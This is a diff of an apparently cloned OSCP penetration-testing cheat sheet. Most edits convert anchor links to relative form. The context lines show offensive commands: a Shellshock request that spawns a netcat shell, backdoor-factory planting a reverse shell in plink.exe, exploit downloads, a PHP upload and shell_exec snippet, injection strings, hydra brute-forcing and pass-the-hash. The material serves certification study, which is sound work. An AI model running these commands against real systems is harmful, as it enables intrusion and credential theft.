@@ -1,14 +1,7 @@
----
-layout: post
-title: "OSCP survival guide"
-categories: [infosec]
-tags: [oscp]
-description: A survival guide to the OSCP.
----
 
 **This is a clone of [frizb/OSCP-Survival-Guide](https://github.com/frizb/OSCP-Survival-Guide)**
 
-**This can also be viewed on [x89k.tk](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html)**
+**This can also be viewed on (x89k.tk)[https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html]**
 
 # OSCP-Survival-Guide
 
@@ -18,33 +11,33 @@ description: A survival guide to the OSCP.
 
 **export ip=192.168.1.100**
 
-## [](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#table-of-contents)Table of Contents
+## [](#table-of-contents)Table of Contents
 
 *   [Kali Linux](#kali-linux)
-*   [Information Gathering & Vulnerability Scanning](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#information-gathering--vulnerability-scanning)
-    *   [Passive Information Gathering](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#passive-information-gathering)
-    *   [Active Information Gathering](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#active-information-gathering)
-    *   [Port Scanning](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#port-scanning)
-    *   [Enumeration](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#enumeration)
-    *   [HTTP Enumeration](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#http-enumeration)
-*   [Buffer Overflows and Exploits](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#buffer-overflows-and-exploits)
-*   [Shells](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#shells)
-*   [File Transfers](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#file-transfers)
-*   [Privilege Escalation](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#privilege-escalation)
-    *   [Linux Privilege Escalation](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#linux-privilege-escalation)
-    *   [Windows Privilege Escalation](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#windows-privilege-escalation)
-*   [Client, Web and Password Attacks](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#client-web-and-password-attacks)
-    *   [Client Attacks](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#client-attacks)
-    *   [Web Attacks](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#web-attacks)
-    *   [File Inclusion Vulnerabilities LFI/RFI](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#file-inclusion-vulnerabilities)
-    *   [Database Vulnerabilities](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#database-vulnerabilities)
-    *   [Password Attacks](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#password-attacks)
-    *   [Password Hash Attacks](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#password-hash-attacks)
-*   [Networking, Pivoting and Tunneling](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#networking-pivoting-and-tunneling)
-*   [The Metasploit Framework](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#the-metasploit-framework)
-*   [Bypassing Antivirus Software](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#bypassing-antivirus-software)
+*   [Information Gathering & Vulnerability Scanning](#information-gathering--vulnerability-scanning)
+    *   [Passive Information Gathering](#passive-information-gathering)
+    *   [Active Information Gathering](#active-information-gathering)
+    *   [Port Scanning](#port-scanning)
+    *   [Enumeration](#enumeration)
+    *   [HTTP Enumeration](#http-enumeration)
+*   [Buffer Overflows and Exploits](#buffer-overflows-and-exploits)
+*   [Shells](#shells)
+*   [File Transfers](#file-transfers)
+*   [Privilege Escalation](#privilege-escalation)
+    *   [Linux Privilege Escalation](#linux-privilege-escalation)
+    *   [Windows Privilege Escalation](#windows-privilege-escalation)
+*   [Client, Web and Password Attacks](#client-web-and-password-attacks)
+    *   [Client Attacks](#client-attacks)
+    *   [Web Attacks](#web-attacks)
+    *   [File Inclusion Vulnerabilities LFI/RFI](#file-inclusion-vulnerabilities)
+    *   [Database Vulnerabilities](#database-vulnerabilities)
+    *   [Password Attacks](#password-attacks)
+    *   [Password Hash Attacks](#password-hash-attacks)
+*   [Networking, Pivoting and Tunneling](#networking-pivoting-and-tunneling)
+*   [The Metasploit Framework](#the-metasploit-framework)
+*   [Bypassing Antivirus Software](#bypassing-antivirus-software)
 
-# [](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#kali-linux)Kali Linux
+# [](#kali-linux)Kali Linux
 
 *   Set the Target IP Address to the `$ip` system variable  
     `export ip=192.168.1.100`
@@ -238,9 +231,9 @@ description: A survival guide to the OSCP.
             iptables -t raw -F iptables -t raw -X
             ```
 
-# [](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#information-gathering--vulnerability-scanning)Information Gathering & Vulnerability Scanning
+# [](#information-gathering--vulnerability-scanning)Information Gathering & Vulnerability Scanning
 
-*   ## [](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#passive-information-gathering)Passive Information Gathering
+*   ## [](#passive-information-gathering)Passive Information Gathering
 
 *   Google Hacking
 
@@ -295,9 +288,9 @@ description: A survival guide to the OSCP.
 
         `help`
 
-*   ## [](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#active-information-gathering)Active Information Gathering
+*   ## [](#active-information-gathering)Active Information Gathering
 
-*   ## [](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#port-scanning)Port Scanning
+*   ## [](#port-scanning)Port Scanning
 
 _Subnet Reference Table_
 
@@ -608,7 +601,7 @@ _Subnet Reference Table_
 *   Scan with Active connect in order to weed out any spoofed ports designed to troll you  
     `nmap -p1-65535 -A -T5 -sT $ip`
 
-*   ## [](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#enumeration)Enumeration
+*   ## [](#enumeration)Enumeration
 
 *   DNS Enumeration
 
@@ -912,7 +905,7 @@ _Subnet Reference Table_
     *   Determine the type of a file  
         `file <filename>`
 
-*   ## [](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#http-enumeration)HTTP Enumeration
+*   ## [](#http-enumeration)HTTP Enumeration
 
     *   Search for folders with gobuster:  
         `gobuster -w /usr/share/wordlists/dirb/common.txt -u $ip`
@@ -996,7 +989,7 @@ _Subnet Reference Table_
     *   Login at:  
         https://$ip:9392
 
-# [](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#buffer-overflows-and-exploits)Buffer Overflows and Exploits
+# [](#buffer-overflows-and-exploits)Buffer Overflows and Exploits
 
 *   DEP and ASLR - Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR)
 
@@ -1091,7 +1084,7 @@ _Subnet Reference Table_
     *   Connect to the shell with netcat:  
         nc -v $ip 4444
 
-# [](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#shells)Shells
+# [](#shells)Shells
 
 *   Netcat Shell Listener
 
@@ -1272,7 +1265,7 @@ _Subnet Reference Table_
 
              echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80
 
-# [](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#file-transfers)File Transfers
+# [](#file-transfers)File Transfers
 
 *   Post exploitation refers to the actions performed by an attacker, once some level of control has been gained on his target.
 
@@ -1333,7 +1326,7 @@ _Subnet Reference Table_
 *   HTTP Put  
     nmap -p80 $ip --script http-put --script-args http-put.url='/test/sicpwn.php',http-put.file='/var/www/html/sicpwn.php
 
-*   ## [](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#uploading-files)Uploading Files
+*   ## [](#uploading-files)Uploading Files
 
     *   SCP
 
@@ -1385,7 +1378,7 @@ _Subnet Reference Table_
 
         /etc/init.d/pure-ftpd restart
 
-*   ## [](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#packing-files)Packing Files
+*   ## [](#packing-files)Packing Files
 
     *   Ultimate Packer for eXecutables  
         upx -9 nc.exe
@@ -1401,11 +1394,11 @@ _Subnet Reference Table_
         cd setup  
         setup.sh -c
 
-# [](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#privilege-escalation)Privilege Escalation
+# [](#privilege-escalation)Privilege Escalation
 
 _Password reuse is your friend. The OSCP labs are true to life, in the way that the users will reuse passwords across different services and even different boxes. Maintain a list of cracked passwords and test them on new machines you encounter._
 
-*   ## [](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#linux-privilege-escalation)Linux Privilege Escalation
+*   ## [](#linux-privilege-escalation)Linux Privilege Escalation
 
 *   Defacto Linux Privilege Escalation Guide - A much more through guide for linux enumeration:[https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](http://web.archive.org/web/20171113221652/https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
 
@@ -1582,7 +1575,7 @@ Handy Kernel Exploits
 
             cat `find / -name proof.txt -print`
 
-*   ## [](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#windows-privilege-escalation)Windows Privilege Escalation
+*   ## [](#windows-privilege-escalation)Windows Privilege Escalation
 
 *   Windows Privilege Escalation resource [http://www.fuzzysecurity.com/tutorials/16.html](http://web.archive.org/web/20171113221652/http://www.fuzzysecurity.com/tutorials/16.html)
 
@@ -1789,9 +1782,9 @@ Handy Kernel Exploits
 
     `#meterpreter > run post/windows/gather/win_privs` `cd\ & dir /b /s proof.txt` `type c:\pathto\proof.txt`
 
-# [](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#client-web-and-password-attacks)Client, Web and Password Attacks
+# [](#client-web-and-password-attacks)Client, Web and Password Attacks
 
-*   ## [](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#client-attacks)Client Attacks
+*   ## [](#client-attacks)Client Attacks
 
     *   MS12-037- Internet Explorer 8 Fixed Col Span ID  
         wget -O exploit.html [http://www.exploit-db.com/download/24017](http://web.archive.org/web/20171113221652/http://www.exploit-db.com/download/24017)  
@@ -1811,7 +1804,7 @@ Handy Kernel Exploits
     *   Injecting a Backdoor Shell into Plink.exe  
         backdoor-factory -f /usr/share/windows-binaries/plink.exe -H $ip -P 4444 -s reverse_shell_tcp
 
-*   ## [](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#web-attacks)Web Attacks
+*   ## [](#web-attacks)Web Attacks
 
     *   Web Shag Web Application Vulnerability Assessment Platform  
         webshag-gui
@@ -1860,7 +1853,7 @@ Handy Kernel Exploits
 
         nc -nlvp 80
 
-*   ## [](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#file-inclusion-vulnerabilities)File Inclusion Vulnerabilities
+*   ## [](#file-inclusion-vulnerabilities)File Inclusion Vulnerabilities
 
     *   Local (LFI) and remote (RFI) file inclusion vulnerabilities are commonly found in poorly written PHP code.
 
@@ -1943,7 +1936,7 @@ Handy Kernel Exploits
 
         `<?php echo shell\_exec("ipconfig");?>`
 
-*   ## [](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#database-vulnerabilities)Database Vulnerabilities
+*   ## [](#database-vulnerabilities)Database Vulnerabilities
 
     *   Playing with SQL Syntax A great tool I have found for playing with SQL Syntax for a variety of database types (MSSQL Server, MySql, PostGreSql, Oracle) is SQL Fiddle:
 
@@ -2149,7 +2142,7 @@ Handy Kernel Exploits
 
       `a'; return this.a != 'BadData’'; var dummy='!`
 
-*   ## [](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#password-attacks)Password Attacks
+*   ## [](#password-attacks)Password Attacks
 
     *   AES Decryption  
         [http://aesencryption.net/](http://web.archive.org/web/20171113221652/http://aesencryption.net/)
@@ -2287,7 +2280,7 @@ Handy Kernel Exploits
 
             `hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`
 
-*   ## [](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#password-hash-attacks)Password Hash Attacks
+*   ## [](#password-hash-attacks)Password Hash Attacks
 
     *   Online Password Cracking  
         [_https://crackstation.net/_](http://web.archive.org/web/20171113221652/https://crackstation.net/) [_http://finder.insidepro.com/_](http://web.archive.org/web/20171113221652/http://finder.insidepro.com/)
@@ -2375,7 +2368,7 @@ Handy Kernel Exploits
 
         `pth-winexe -U administrator //$ip cmd`
 
-# [](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#networking-pivoting-and-tunneling)Networking, Pivoting and Tunneling
+# [](#networking-pivoting-and-tunneling)Networking, Pivoting and Tunneling
 
 *   Port Forwarding - accept traffic on a given IP address and port and redirect it to a different IP address and port
 
@@ -2556,7 +2549,7 @@ Handy Kernel Exploits
 
         `dnscat --host <dnscat server ip>`
 
-# [](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#the-metasploit-framework)The Metasploit Framework
+# [](#the-metasploit-framework)The Metasploit Framework
 
 *   See [_Metasploit Unleashed Course_](http://web.archive.org/web/20171113221652/https://www.offensive-security.com/metasploit-unleashed/) in the Essentials
 
@@ -2741,7 +2734,7 @@ Handy Kernel Exploits
 
         `background`
 
-# [](https://x89k.tk/infosec/2018/11/03/oscpsurvivalguide.html#bypassing-antivirus-software)Bypassing Antivirus Software
+# [](#bypassing-antivirus-software)Bypassing Antivirus Software
 
 *   Crypting Known Malware with Software Protectors
 
